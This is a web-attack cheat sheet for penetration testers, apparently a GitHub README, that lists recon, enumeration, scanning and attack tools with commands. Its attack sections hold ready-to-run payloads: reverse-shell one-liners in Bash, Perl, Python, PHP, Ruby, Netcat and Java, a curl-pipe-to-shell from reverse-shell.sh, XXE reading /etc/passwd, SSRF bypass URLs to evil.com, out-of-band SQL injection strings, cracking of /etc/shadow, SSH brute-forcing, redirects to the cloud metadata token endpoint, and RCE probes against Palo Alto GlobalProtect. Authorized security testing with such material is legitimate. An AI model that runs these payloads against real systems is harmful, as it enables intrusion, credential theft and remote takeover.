# Web-Attack-Cheat-Sheet


## Discovering

### General
	https://github.com/redhuntlabs/Awesome-Asset-Discovery
		# Through this repository, we want to put out a list of curated resources which help during asset discovery phase of a security assessment engagement.
	
	https://spyse.com
		# Spyse holds the largest database of its kind, containing a wide range of OSINT data handy for the reconnaissance.
	
	https://github.com/yogeshojha/rengine
		# reNgine is an automated reconnaissance framework meant for information gathering during penetration testing of web applications.
	
### Targets
	https://github.com/arkadiyt/bounty-targets-data
		# This repo contains data dumps of Hackerone and Bugcrowd scopes (i.e. the domains that are eligible for bug bounty reports).

### IP Enumeration
	http://www.asnlookup.com
		# This tool leverages ASN to look up IP addresses (IPv4 & IPv6) owned by a specific organization for reconnaissance purposes.

	https://github.com/pielco11/fav-up
		# Lookups for real IP starting from the favicon icon and using Shodan.
			python3 favUp.py --favicon-file favicon.ico -sc

### Subdomain Enumeration
	https://appsecco.com/books/subdomain-enumeration
		# This book intendes to be a reference for subdomain enumeration techniques.
	
	https://github.com/OWASP/Amass
		# The OWASP Amass Project performs network mapping of attack surfaces and external asset discovery using open source information gathering and active reconnaissance techniques.
			amass enum -passive -dir /tmp/amass_output/ -d example.com -o dir/example.com

	https://github.com/projectdiscovery/subfinder
		# subfinder is a subdomain discovery tool that discovers valid subdomains for websites by using passive online sources.
			subfinder -r 8.8.8.8,8.8.4.4,1.1.1.1,1.0.0.1 -t 10 -v -d example.com -o dir/example.com
	
	https://github.com/nsonaniya2010/SubDomainizer
		# SubDomainizer is a tool designed to find hidden subdomains and secrets present is either webpage, Github, and external javascripts present in the given URL.
			python3 SubDomainizer.py -u example.com -o dir/example.com
	
	https://dns.bufferover.run/dns?q=example.com
		# Powered by DNSGrep (https://github.com/erbbysam/DNSGrep)
			# A utility for quickly searching presorted DNS names. Built around the Rapid7 rdns & fdns dataset.
	
	https://crt.sh/?q=example.com
		# Certificate Search
	
	https://censys.io/certificates?q=parsed.subject_dn%3AO%3DExample+Organization
		# Censys is the most reputable, exhaustive, and up-to-date source of Internet scan data in the world, so you see everything.
	
	https://www.shodan.io/search?query=ssl%3AExample
		# Shodan is the world's first search engine for Internet-connected devices.
		
	https://fofa.so
		# FOFA (Cyberspace Assets Retrieval System) is the world's IT equipment search engine with more complete data coverage, and it has more complete DNA information of global networked IT equipment.
	
	https://www.zoomeye.org
		# ZoomEyeis China's first and world-renowned cyberspace search engine driven by 404 Laboratory of Knownsec. Through a large number of global surveying and mapping nodes, according to the global IPv4, IPv6 address and website domain name databases，it can continuously scan and identify multiple service port and protocols 24 hours a day, and finally map the whole or local cyberspace.
	
	https://securitytrails.com/list/email/dns-admin.example.com
		# Total Internet Inventory with the most comprehensive data that informs with unrivaled accuracy.
			curl --request POST --url 'https://api.securitytrails.com/v1/domains/list?apikey={API_Key}&page=1&scroll=true' --data '{"filter":{"apex_domain":"example.com"}}' | jq '.records[].hostname' | sed 's/"//g' >> subdomains.txt
			curl --request POST --url 'https://api.securitytrails.com/v1/domains/list?apikey={API_Key}&page=1&scroll=true' --data '{"filter":{"whois_email":"domains@example.com"}}' | jq '.records[].hostname' | sed 's/"//g' >> domains.txt
	
	https://viewdns.info/reversewhois
		# This free tool will allow you to find domain names owned by an individual person or company.
	
	https://opendata.rapid7.com/
		# Offering researchers and community members open access to data from Project Sonar, which conducts internet-wide surveys to gain insights into global exposure to common vulnerabilities.

### Wayback Machine
	https://github.com/tomnomnom/waybackurls
		# Accept line-delimited domains on stdin, fetch known URLs from the Wayback Machine for *.domain and output them on stdout.
			cat subdomains.txt | waybackurls > waybackurls.txt
		
	https://github.com/tomnomnom/hacks
		# Hacky one-off scripts, tests etc.
			cat waybackurls.txt | go run /root/Tools/hacks/anti-burl/main.go | tee waybackurls_valid.txt
	
### Cache
	https://www.giftofspeed.com/cache-checker
		# This tool lists which web files on a website are cached and which are not. Furthermore it checks by which method these files are cached and what the expiry time of the cached files is.

### Crawling
	https://github.com/jaeles-project/gospider
		# Fast web spider written in Go.
			gospider -s "https://example.com/" -o output -c 20 -d 10

### Wordlist
	https://portswigger.net/bappstore/21df56baa03d499c8439018fe075d3d7
		# Scrapes all unique words and numbers for use with password cracking.
		
	https://github.com/ameenmaali/wordlistgen
		# wordlistgen is a tool to pass a list of URLs and get back a list of relevant words for your wordlists.
			cat hosts.txt | wordlistgen
		
	https://github.com/adamtlangley/gitscraper
		# A tool which scrapes public github repositories for common naming conventions in variables, folders and files.
			php gitscraper.php {GitHub Username} {GitHub Personal KEY}
	
	https://github.com/danielmiessler/SecLists
		# SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.
	
	https://github.com/swisskyrepo/PayloadsAllTheThings
		# A list of useful payloads and bypasses for Web Application Security. Feel free to improve with your payloads and techniques.
	
	https://github.com/fuzzdb-project/fuzzdb
		# FuzzDB was created to increase the likelihood of finding application security vulnerabilities through dynamic application security testing.
	
	https://github.com/google/fuzzing
		# This project aims at hosting tutorials, examples, discussions, research proposals, and other resources related to fuzzing.
	
	https://github.com/xyele/hackerone_wordlist
		# The wordlists that have been compiled using disclosed reports at the HackerOne bug bounty platform.
	
	https://wordlists.assetnote.io
		# This website provides you with wordlists that are up to date and effective against the most popular technologies on the internet.

### Directory Bruteforcing
	https://github.com/ffuf/ffuf
		# A fast web fuzzer written in Go.
			ffuf -H 'User-Agent: Mozilla' -v -t 30 -w mydirfilelist.txt -b 'NAME1=VALUE1; NAME2=VALUE2' -u 'https://example.com/FUZZ'
		
	https://github.com/OJ/gobuster
		# Gobuster is a tool used to brute-force.
			gobuster dir -a 'Mozilla' -e -k -l -t 30 -w mydirfilelist.txt -c 'NAME1=VALUE1; NAME2=VALUE2' -u 'https://example.com/'

	https://github.com/tomnomnom/meg
		# meg is a tool for fetching lots of URLs but still being 'nice' to servers.
			meg -c 50 -H 'User-Agent: Mozilla' -s 200 weblogic.txt example.txt weblogic

	https://github.com/deibit/cansina
		# Cansina is a Web Content Discovery Application.
			python3 cansina.py -u 'https://example.com/' -p mydirfilelist.txt --persist
		
	https://github.com/epi052/feroxbuster
		# A simple, fast, recursive content discovery tool written in Rust.
			feroxbuster -u 'https://example.com/' -x pdf -x js,html -x php txt json,docx
	
### DNS and HTTP detection
	https://ceye.io
		# Monitor service for security testing.
			curl http://api.ceye.io/v1/records?token={API Key}&type=dns
			curl http://api.ceye.io/v1/records?token={API Key}&type=http

	https://portswigger.net/burp/documentation/collaborator
		# Burp Collaborator is a network service that Burp Suite uses to help discover many kinds of vulnerabilities.
		# Tip https://www.onsecurity.co.uk/blog/gaining-persistent-access-to-burps-collaborator-sessions
		
	http://pingb.in
		# Simple DNS and HTTP service for security testing.
	
	https://github.com/ctxis/SnitchDNS
		# SnitchDNS is a database driven DNS Server with a Web UI, written in Python and Twisted, that makes DNS administration easier with all configuration changed applied instantly without restarting any system services.
		
	http://dnslog.cn
		# Simple DNS server with realitme logs.
		
### Acquisitions/Names/Addresses/Contacts/Emails/etc.
	https://hunter.io
		# Hunter lets you find email addresses in seconds and connect with the people that matter for your business.
	
	https://intelx.io
		# Intelligence X is an independent European technology company founded in 2018 by Peter Kleissner. The company is based in Prague, Czech Republic. Its mission is to develop and maintain the search engine and data archive.

	https://github.com/khast3x/h8mail
		# h8mail is an email OSINT and breach hunting tool using different breach and reconnaissance services, or local breaches such as Troy Hunt's "Collection1" and the infamous "Breach Compilation" torrent.
			h8mail -t target@example.com
	
	https://dashboard.fullcontact.com
		# Our person-first Identity Resolution Platform provides the crucial intelligence needed to drive Media Amplification, Omnichannel Measurement, and Customer Recognition.
	
	https://www.peopledatalabs.com
		# Our data empowers developers to build innovative, trusted data-driven products at scale.
	
	https://www.social-searcher.com
		# Free Social Media Search Engine.
	
	https://github.com/mxrch/GHunt
		# GHunt is an OSINT tool to extract information from any Google Account using an email.
			python3 ghunt.py email myemail@gmail.com

### HTML/JavaScript Comments
	https://portswigger.net/support/using-burp-suites-engagement-tools
		# Burp Engagement Tools
	
### Google Dorks
	https://www.exploit-db.com/google-hacking-database

### Content Security Policy (CSP)
	https://csp-evaluator.withgoogle.com/

### Tiny URLs Services
	https://www.scribd.com/doc/308659143/Cornell-Tech-Url-Shortening-Research
	
	https://github.com/utkusen/urlhunter
		urlhunter -keywords keywords.txt -date 2020-11-20 -o out.txt
		
	https://shorteners.grayhatwarfare.com
		Search Shortener Urls

### GraphQL
	https://github.com/doyensec/graph-ql
	
	https://hackernoon.com/understanding-graphql-part-1-nxm3uv9
	
	https://graphql.org/learn/introspection/
	
	https://jondow.eu/practical-graphql-attack-vectors/
	
	https://lab.wallarm.com/why-and-how-to-disable-introspection-query-for-graphql-apis/
	
	https://lab.wallarm.com/securing-and-attacking-graphql-part-1-overview/
	
	https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4
	
	https://the-bilal-rizwan.medium.com/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696

### General
	https://github.com/redhuntlabs/Awesome-Asset-Discovery
	
	https://github.com/phor3nsic/favicon_hash_shodan
		Search for a framework by favicon
		
	https://github.com/crashbrz/WebXmlExploiter/


## Enumerating

### Fingerprint
	https://github.com/urbanadventurer/WhatWeb
		whatweb -a 4 -U 'Mozilla' -c 'NAME1=VALUE1; NAME2=VALUE2' -t 20 www.example.com

	https://builtwith.com

	https://www.wappalyzer.com
	
	https://webtechsurvey.com

	https://portswigger.net/bappstore/c9fb79369b56407792a7104e3c4352fb
		Software Vulnerability Scanner Burp Extension
		
	https://github.com/GrrrDog/weird_proxies
		# It's a cheat sheet about behaviour of various reverse proxies and related attacks.

### Buckets
	List s3 bucket permissions and keys
		https://aws.amazon.com/cli/
			aws s3api get-bucket-acl --bucket examples3bucketname
			aws s3api get-object-acl --bucket examples3bucketname --key dir/file.ext
			aws s3api list-objects --bucket examples3bucketname
			aws s3api list-objects-v2 --bucket examples3bucketname
			aws s3api get-object --bucket examples3bucketname --key dir/file.ext localfilename.ext
			aws s3api put-object --bucket examples3bucketname --key dir/file.ext --body localfilename.ext
			
	Find interesting Amazon S3 Buckets by watching certificate transparency logs
		https://github.com/eth0izzle/bucket-stream
			
	Search Public Buckets
		https://buckets.grayhatwarfare.com/
		
	Burp Suite extension which can identify and test S3 buckets
		https://github.com/VirtueSecurity/aws-extender

### Cloud Enumeration
	https://github.com/andresriancho/enumerate-iam
	
	https://github.com/nccgroup/ScoutSuite
	
	https://github.com/toniblyx/prowler
	
	https://github.com/salesforce/endgame
	
	https://github.com/salesforce/cloudsplaining
	
	https://github.com/cloudsploit/scans
	
	https://github.com/RhinoSecurityLabs/pacu
	
	https://github.com/VirtueSecurity/aws-extender
	
	https://github.com/irgoncalves/gcp_security
	
	https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
	
	https://cloud.google.com/compute/docs/storing-retrieving-metadata
	
	https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
	
	https://www.alibabacloud.com/help/doc-detail/49122.htm
	
	https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/
		# Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments.

### Containerization
	https://github.com/stealthcopter/deepce
		# Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE).

### Visual Identification
	https://github.com/FortyNorthSecurity/EyeWitness
		eyewitness --web --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" --threads 10 --timeout 30 --prepend-https -f "${PWD}/subdomains.txt" -d "${PWD}/eyewitness/"

	https://github.com/michenriksen/aquatone
		cat targets.txt | aquatone
		
	https://github.com/sensepost/gowitness
		gowitness scan --cidr 192.168.0.0/24 --threads 20


## Scanning

### Static Application Security Testing
	https://github.com/returntocorp/semgrep
		Semgrep is a fast, open-source, static analysis tool that excels at expressing code standards — without complicated queries — and surfacing bugs early at editor, commit, and CI time.

### Dependency Confusion (https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
	https://github.com/dwisiswant0/nodep
		nodep — check available dependency packages across npmjs, PyPI or RubyGems registry.
		
	https://github.com/visma-prodsec/confused
		A tool for checking for lingering free namespaces for private package names referenced in dependency configuration for Python (pypi) requirements.txt, JavaScript (npm) package.json, PHP (composer) composer.json or MVN (maven) pom.xml.

### Send emails (SMTP)
	while read i; do echo $i; echo -e "From: example1@gmail.com\nTo: ${i}\nCc: example2@gmail.com\nSubject: This is the subject ${i}\n\nThis is the body ${i}" | ssmtp ${i},example2@gmail.com; done < emails.txt
	References
		Ticket Trick https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c 
		Abusing autoresponders and email bounces https://medium.com/intigriti/abusing-autoresponders-and-email-bounces-9b1995eb53c2

### Search Vulnerabilities
	https://github.com/vulnersCom/getsploit
		getsploit wordpress 4.7.0
		
	https://www.exploit-db.com/searchsploit
		searchsploit -t oracle windows
		
	https://github.com/vulmon/Vulmap
		Vulmap is an open-source online local vulnerability scanner project. It consists of online local vulnerability scanning programs for Windows and Linux operating systems.
		
### Web Scanning
	https://support.portswigger.net/customer/portal/articles/1783127-using-burp-scanner
		# Burp Scanner is a tool for automatically finding security vulnerabilities in web applications.
		
	https://github.com/spinkham/skipfish
		# Skipfish is an active web application security reconnaissance tool.
			skipfish -MEU -S dictionaries/minimal.wl -W new_dict.wl -C "AuthCookie=value" -X /logout.aspx -o output_dir http://www.example.com/
	
	https://github.com/sullo/nikto
		nikto -ssl -host www.example.com

	https://github.com/wpscanteam/wpscan
		wpscan --disable-tls-checks --ignore-main-redirect --user-agent 'Mozilla' -t 10 --force --wp-content-dir wp-content --url blog.example.com
		
	https://github.com/droope/droopescan
		droopescan scan drupal -u example.com
		
	https://github.com/projectdiscovery/nuclei
		# Nuclei is used to send requests across targets based on a template leading to zero false positives and providing fast scanning on large number of hosts.
			nuclei -l urls.txt -t cves/ -t files/ -o results.txt
	
	https://github.com/six2dez/reconftw
		# reconFTW is a tool designed to perform automated recon on a target domain by running the best set of tools to perform enumeration and finding out vulnerabilities.
			reconftw.sh -d target.com -a
		
	https://gobies.org
		# The new generation of network security technology achieves rapid security emergency through the establishment of a complete asset database for the target.
		
	https://github.com/commixproject/commix
		# By using this tool, it is very easy to find and exploit a command injection vulnerability in a certain vulnerable parameter or HTTP header.
			python commix.py --url="http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#" --data="ip=127.0.0.1&Submit=submit" --cookie="security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4"
	
	https://github.com/MrCl0wnLab/ShellShockHunter
		# Shellshock, also known as Bashdoor, is a family of security bugs in the Unix Bash shell, the first of which was disclosed on 24 September 2014.
			python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 40 --ssl

### HTTP Request Smuggling
	https://github.com/defparam/smuggler
		python3 smuggler.py -q -u https://example.com/
		
	https://github.com/BishopFox/h2csmuggler
		h2csmuggler.py -x https://example.com/ --test
		
	https://github.com/0ang3el/websocket-smuggle
	
	https://portswigger.net/web-security/request-smuggling
	
	https://github.com/PortSwigger/http-request-smuggler
	
	https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142

### Subdomain Takeover
	https://github.com/anshumanbh/tko-subs
		tko-subs -data providers-data.csv -threads 20 -domains subdomains.txt

	https://github.com/Ice3man543/SubOver
		SubOver -l subdomains.txt
	
### SQLi
	https://github.com/sqlmapproject/sqlmap
		sqlmap --force-ssl -r RAW_REQUEST.txt --user-agent='Mozilla' --batch 
		sqlmap -vv -u 'https://www.example.com?id=1*' --user-agent='Mozilla' --level 5 --risk 3 --batch
	
### Repositories Scanning
	https://github.com/zricethezav/gitleaks
		gitleaks --github-org=organization --threads=4 -v --disk
		
	https://github.com/michenriksen/gitrob
	
	https://github.com/dxa4481/truffleHog
	
	https://github.com/awslabs/git-secrets
	
	https://github.com/eth0izzle/shhgit
	
	https://www.shhgit.com/

### Google Dorks Scanning
	https://github.com/opsdisk/pagodo
		python3 pagodo.py -d example.com -g dorks.txt -l 50 -s -e 35.0 -j 1.1

### CORS Misconfigurations
	https://github.com/s0md3v/Corsy
		python3 corsy.py -u https://example.com


## Monitoring

### CVE
	https://www.opencve.io/
		OpenCVE (formerly known as Saucs.com) allows you to subscribe to vendors and products, and send you an alert as soon as a CVE is published or updated.


## Attacking

### Brute Force
	https://github.com/vanhauser-thc/thc-hydra
		hydra -l root -P 10-million-password-list-top-1000.txt www.example.com -t 4 ssh

	https://www.openwall.com/john/
		unshadow /etc/passwd /etc/shadow > mypasswd.txt
		john mypasswd.txt
		
	https://hashcat.net/hashcat/
		hashcat -m 0 -a 0 hashes.txt passwords.txt

	Rotate the source IP address in order to bypass rate limits
		https://github.com/ustayready/fireprox

### Exfiltration
	A bash script that automates the exfiltration of data over dns
		https://github.com/vp777/procrustes
		
	The successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.
		https://github.com/sensepost/reGeorg
		
	This tool can forward TCP traffic over DNS protocol. Non-compile clients + socks5 support.
		https://github.com/fbkcs/ThunderDNS

## Manual

### Payloads
	https://github.com/swisskyrepo/PayloadsAllTheThings
		PayloadsAllTheThings
	
	https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html
		Unicode normalization good for WAF bypass.
  
	XSS
		https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
		
	XXE
		https://portswigger.net/web-security/xxe
			<?xml version="1.0" encoding="UTF-8"?>
			<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
			<stockCheck><productId>&xxe;</productId></stockCheck>
		https://phonexicum.github.io/infosec/xxe.html
			<!DOCTYPE foo SYSTEM "http://xpto.burpcollaborator.net/xpto.dtd">
		https://github.com/GoSecure/dtd-finder
			Identify DTDs on filesystem snapshot and build XXE payloads using those local DTDs.
	
	SSRF
		https://www.blackhat.com/us-17/briefings.html#a-new-era-of-ssrf-exploiting-url-parser-in-trending-programming-languages
			# We propose a new exploit technique that brings a whole-new attack surface to bypass SSRF (Server Side Request Forgery) protections.
				http://1.1.1.1&@2.2.2.2#@3.3.3.3/
				http://127.0.0.1:11211:80/
				http://google.com#@evil.com/
				http://foo@evil.com:80@google.com/
				http://foo@evil.com:80 @google.com/
				http://127.0.0.1\tfoo.google.com/
				http://127.0.0.1%09foo.google.com/
				http://127.0.0.1%2509foo.google.com/
				http://127.0.0.1:11211#@google.com:80/
				http://foo@127.0.0.1:11211@google.com:80/
				http://foo@127.0.0.1 @google.com:11211/

### Deserialization
	https://github.com/joaomatosf/jexboss
	
	https://github.com/pimps/JNDI-Exploit-Kit

### Reusing Cookies
	https://medium.com/@ricardoiramar/reusing-cookies-23ed4691122b

### SSRF (Server-Side Request Forgery)
	https://lab.wallarm.com/blind-ssrf-exploitation/

### DNS Rebinding
	https://github.com/brannondorsey/dns-rebind-toolkit
	
	https://github.com/brannondorsey/whonow
	
	https://nip.io
	
	http://xip.io
	
	https://sslip.io
	
	http://1u.ms/
		# This is a small set of zero-configuration DNS utilities for assisting in detection and exploitation of SSRF-related vulnerabilities. It provides easy to use DNS rebinding utility, as well as a way to get resolvable resource records with any given contents.

### SMTP Header Injection
	https://www.acunetix.com/blog/articles/email-header-injection/
		POST /contact.php HTTP/1.1
		Host: www.example2.com
 
		name=Best Product\nbcc: everyone@example3.com&replyTo=blame_anna@example.com&message=Buy my product!

### Reverse Shell
	http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
		Bash
			bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

		PERL
			perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

		Python
			python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

		PHP
			php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

		Ruby
			ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

		Netcat
			nc -e /bin/sh 10.0.0.1 1234
			rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
		Java
			r = Runtime.getRuntime()
			p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
			p.waitFor()

		xterm
			xterm -display 10.0.0.1:1
			Xnest :1
			xhost +targetip
	
	https://reverse-shell.sh/
		nc -l 1337
		curl https://reverse-shell.sh/yourip:1337 | sh
		
	https://github.com/calebstewart/pwncat

### SQLi (SQL Injection)
	DNS Detection
		Oracle
			'||(SELECT%20UTL_INADDR.GET_HOST_ADDRESS('xpto.example.com'))||'
			'||(SELECT%20UTL_HTTP.REQUEST('http://xpto.example.com')%20FROM%20DUAL)||'
			'||(SELECT%20HTTPURITYPE('http://xpto.example.com').GETCLOB()%20FROM%20DUAL)||'
			'||(SELECT%20DBMS_LDAP.INIT(('xpto.example.com',80)%20FROM%20DUAL)||'
			
		MySQL
			'||(SELECT%20LOAD_FILE('\\xpto.example.com'))||'
			
		Microsoft SQL Server
			'+;EXEC('master..xp_dirtree"\\xpto.example.com\"');+'
			'+;EXEC('master..xp_fileexist"\\xpto.example.com\"');+'
			'+;EXEC('master..xp_subdirs"\\xpto.example.com\"');+'
			
		PostgreSQL
			'||;COPY%20users(names)%20FROM%20'\\xpto.example.com\';||'

### SSTI (Server Side Template Injection)
	# Template Injections (SSTI) in 10 minutes
		https://www.youtube.com/watch?v=SN6EVIG4c-0
		
	https://portswigger.net/research/server-side-template-injection
	
	https://github.com/epinna/tplmap
		tplmap.py --os-shell -u 'http://www.example.com/page?name=John'

### WebDAV (Web Distributed Authoring and Versioning)
	http://www.webdav.org/cadaver/
		# cadaver is a command-line WebDAV client for Unix.
		
	https://github.com/cldrn/davtest
		# This program attempts to exploit WebDAV enabled servers.

### Generic Tools
	The Cyber Swiss Army Knife
		https://gchq.github.io/CyberChef/
		
	Pcap analysis and samples
		https://packettotal.com/

### General
	# A simple HTTP Request & Response Service.
		https://httpbin.org/
		
	# Fake HTTP Server
		while true ; do echo -e "HTTP/1.1 200 OK\nContent-Length: 0\n\n" | nc -vl 1.2.3.4 80; done
		socat -v -d -d TCP-LISTEN:80,crlf,reuseaddr,fork 'SYSTEM:/bin/echo "HTTP/1.1 200 OK";/bin/echo "Content-Length: 2";/bin/echo;/bin/echo "OK"'
		socat -v -d -d TCP-LISTEN:80,crlf,reuseaddr,fork 'SYSTEM:/bin/echo "HTTP/1.1 302 Found";/bin/echo "Content-Length: 0";/bin/echo "Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";/bin/echo;/bin/echo'
		python2 -m SimpleHTTPServer 8080
		python3 -m http.server 8080
		php -S 0.0.0.0:80
		ruby -run -e httpd . -p 80
		busybox httpd -f -p 80
    
	# Fake HTTPS Server
		openssl req -new -x509 -keyout test.key -out test.crt -nodes
		cat test.key test.crt > test.pem
		socat -v -d -d openssl-listen:443,crlf,reuseaddr,cert=test.pem,verify=0,fork 'SYSTEM:/bin/echo "HTTP/1.1 200 OK";/bin/echo "Content-Length: 2";/bin/echo;/bin/echo "OK"'
		socat -v -d -d openssl-listen:443,crlf,reuseaddr,cert=web.pem,verify=0,fork 'SYSTEM:/bin/echo "HTTP/1.1 302 Found";/bin/echo "Content-Length: 0";/bin/echo "Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";/bin/echo;/bin/echo'
	
	# Fake FTP Server
		python -m pyftpdlib --directory=/tmp/dir/ --port=21

	# Check HTTP or HTTPS
		while read i; do curl -m 15 -ki http://$i &> /dev/null; if [ $? -eq 0 ]; then echo $i; fi; done < subdomains.txt
		while read i; do curl -m 15 -ki https://$i &> /dev/null; if [ $? -eq 0 ]; then echo $i; fi; done < subdomains.txt

	# Ten requests in parallel
		xargs -I % -P 10 curl -H 'Connection: close' -s -D - -o /dev/null https://example.com < <(printf '%s\n' {1..10000})
		
	# Access target directly through IP address
		http://1.2.3.4
		https://1.2.3.4

	# Trim space and newlines on bash variable
		"${i//[$'\t\r\n ']}"
		
	# GTFOBins is a curated list of Unix binaries that can used to bypass local security restrictions in misconfigured systems.
		https://gtfobins.github.io/
	
	# Mirror a single page
		wget -mkEpnp https://www.example.com/
	
	# Referer spoofing
		<base href="https://www.google.com/">
		<style>
    			@import 'https://CSRF.vulnerable.example/';
		</style>
		
	# Check PreAuth RCE on Palo Alto GlobalProtect
		https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html
			time curl -s -d 'scep-profile-name=%9999999c' https://${HOST}/sslmgr >/dev/null
			time curl -s -d 'scep-profile-name=%99999999c' https://${HOST}/sslmgr >/dev/null
			time curl -s -d 'scep-profile-name=%999999999c' https://${HOST}/sslmgr >/dev/null
